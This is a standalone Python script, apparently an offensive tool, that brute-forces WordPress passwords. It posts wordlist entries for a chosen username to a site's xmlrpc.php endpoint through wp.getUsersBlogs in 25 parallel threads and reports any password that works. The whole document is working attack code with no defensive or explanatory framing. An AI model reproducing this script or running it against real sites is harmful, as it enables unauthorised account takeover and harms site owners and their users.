#!/usr/bin/env python3
import requests
import threading
import queue
import sys
import time

URL = sys.argv[1]
WORDLIST = sys.argv[2]
USERNAME = sys.argv[3]

thread_count = 25          # max safe number right now
chunk_size = 1             # one password per request (for reliability)

def make_request(password):
    xml = f'''<?xml version="1.0"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param>
            <value>{USERNAME}</value>
        </param>
        <param>
            <value>{password}</value>
        </param>
    </params>
</methodCall>'''
    return xml

def worker(q, results):
    while True:
        password = q.get()
        if password is None:
            break

        try:
            r = requests.post(URL, data=make_request(password),
                              headers={"Content-Type": "text/xml"},
                              timeout=15)

            if "incorrect" not in r.text.lower() and "admin" in r.text.lower():
                results.put(password)

        except Exception as e:
            pass

        q.task_done()

def banner():
    print(f"""
    + -- --=[XML-RPC Fast Brute Force
    + -- --=[Target : {URL}
    + -- --=[User   : {USERNAME}
    + -- --=[Speed  : ~{thread_count} passwords/sec
    """)

def main():
    with open(WORDLIST) as f:
        passwords = [line.strip() for line in f if line.strip()]

    q = queue.Queue()
    results = queue.Queue()

    # Fill queue
    for p in passwords:
        q.put(p)

    # Start 25 threads
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker, args=(q, results))
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

    # Stop threads
    for _ in range(thread_count):
        q.put(None)
    for t in threads:
        t.join()

    if not results.empty():
        print(f"\n[+] SUCCESS! Password found: {results.get()}")
    else:
        print("\n[-] No password found in wordlist.")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 xmlrpc_fast_brute.py https://target.com/xmlrpc.php passwords.txt username")
        sys.exit(1)

    banner()
    main()
                     
